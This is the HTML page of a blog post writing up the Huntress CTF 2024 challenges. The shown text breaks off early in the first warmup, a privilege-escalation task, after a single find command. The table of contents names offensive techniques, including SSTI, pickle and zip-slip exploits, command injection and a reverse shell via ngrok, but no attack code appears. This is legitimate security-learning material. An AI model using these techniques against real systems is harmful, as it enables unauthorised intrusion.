<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Participated in Huntress CTF, lasting for the month of October. I managed to solve all the web challenges, and our team finished with 127th place! There were a ton of challenges, some good and some bad. I didn't write on all of the challenges completed, but I wanted to highlight a few of the more interesting challenges, plus a few warmup challenges that were simple to write on.">
<title>Huntress CTF 2024</title>

<link rel='canonical' href='//localhost:1313/post/huntress-ctf-2024/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Huntress CTF 2024">
<meta property='og:description' content="Participated in Huntress CTF, lasting for the month of October. I managed to solve all the web challenges, and our team finished with 127th place! There were a ton of challenges, some good and some bad. I didn't write on all of the challenges completed, but I wanted to highlight a few of the more interesting challenges, plus a few warmup challenges that were simple to write on.">
<meta property='og:url' content='//localhost:1313/post/huntress-ctf-2024/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Malware' /><meta property='article:tag' content='Forensics' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='Pickle' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='Proxy' /><meta property='article:tag' content='Command Injection' /><meta property='article:tag' content='Powershell' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='Webhook' /><meta property='article:tag' content='API' /><meta property='article:tag' content='ngrok' /><meta property='article:tag' content='SQL Injection' /><meta property='article:tag' content='Zip Slip' /><meta property='article:tag' content='Cheat Engine' /><meta property='article:tag' content='Wireshark' /><meta property='article:tag' content='Zimmerman Tools' /><meta property='article:tag' content='Cyberchef' /><meta property='article:published_time' content='2024-11-03T16:15:36-06:00'/><meta property='article:modified_time' content='2024-11-03T16:15:36-06:00'/><meta property='og:image' content='//localhost:1313/post/huntress-ctf-2024/HuntressCTF_Banner.png' />
<meta name="twitter:title" content="Huntress CTF 2024">
<meta name="twitter:description" content="Participated in Huntress CTF, lasting for the month of October. I managed to solve all the web challenges, and our team finished with 127th place! There were a ton of challenges, some good and some bad. I didn't write on all of the challenges completed, but I wanted to highlight a few of the more interesting challenges, plus a few warmup challenges that were simple to write on."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='//localhost:1313/post/huntress-ctf-2024/HuntressCTF_Banner.png' />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu15825637002793526326.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="//localhost:1313/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/spencerja'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://app.hackthebox.com/profile/1202496'
                        target="_blank"
                        title="HackTheBox"
                        rel="me"
                    >
                        
                        
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ctftime.org/team/217710'
                        target="_blank"
                        title="Team"
                        rel="me"
                    >
                        
                        
                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
    preserveAspectRatio="xMidYMid meet">
    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://tryhackme.com/p/spencerj'
                        target="_blank"
                        title="TryHackMe"
                        rel="me"
                    >
                        
                        
                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>

                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#warmups">Warmups</a>
      <ul>
        <li><a href="#finders-fee">Finders fee</a></li>
        <li><a href="#whamazon">Whamazon</a></li>
        <li><a href="#unbelievable">Unbelievable</a></li>
        <li><a href="#zulu">Zulu</a></li>
        <li><a href="#typo">Typo</a></li>
      </ul>
    </li>
    <li><a href="#miscellaneous">Miscellaneous</a>
      <ul>
        <li><a href="#permission-to-proxy">Permission To Proxy</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#y2j">Y2J</a></li>
        <li><a href="#plantopia">Plantopia</a>
          <ul>
            <li><a href="#solve-method-overwrite-an-image">Solve method: overwrite an image</a></li>
            <li><a href="#solve-method-reverse-shell-via-ngrok">Solve method: Reverse shell via ngrok</a></li>
          </ul>
        </li>
        <li><a href="#helpfuldesk">HelpfulDesk</a></li>
        <li><a href="#pillowfight">PillowFight</a></li>
        <li><a href="#moveable">MOVEable</a></li>
        <li><a href="#zippy">Zippy</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering">Reverse Engineering</a>
      <ul>
        <li><a href="#knights-quest">Knight&rsquo;s Quest</a></li>
      </ul>
    </li>
    <li><a href="#forensics">Forensics</a>
      <ul>
        <li><a href="#keyboard-junkie">Keyboard Junkie</a></li>
        <li><a href="#zimmer-down">Zimmer Down</a></li>
      </ul>
    </li>
    <li><a href="#malware">Malware</a>
      <ul>
        <li><a href="#palimpsest">Palimpsest</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/huntress-ctf-2024/">
                <img src="/post/huntress-ctf-2024/HuntressCTF_Banner_hu2673514548905965148.png"
                        srcset="/post/huntress-ctf-2024/HuntressCTF_Banner_hu2673514548905965148.png 800w, /post/huntress-ctf-2024/HuntressCTF_Banner_hu12453717134759664310.png 1600w"
                        width="800" 
                        height="370" 
                        loading="lazy"
                        alt="Featured image of post Huntress CTF 2024" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/huntress-ctf-2024/">Huntress CTF 2024</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Participated in Huntress CTF, lasting for the month of October. I managed to solve all the web challenges, and our team finished with 127th place! There were a ton of challenges, some good and some bad. I didn&#39;t write on all of the challenges completed, but I wanted to highlight a few of the more interesting challenges, plus a few warmup challenges that were simple to write on.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Nov 03, 2024</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="warmups">Warmups
</h2><h3 id="finders-fee">Finders fee
</h3><blockquote>
<p>You gotta make sure the people who find stuff for you are rewarded well!<br>
<strong>Escalate your privileges and uncover the <code>flag.txt</code> in the <code>finder</code> user&rsquo;s home directory.</strong></p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>I tried <code>find</code> to locate the flag, only to learn I don&rsquo;t have read permissions. Interesting how <code>find</code> was able to locate, and I learn that it has interesting permissions:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ find . -name &#34;*.txt&#34; 2&gt;/dev/null
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/ssh_import_id-5.11.egg-info/requires.txt
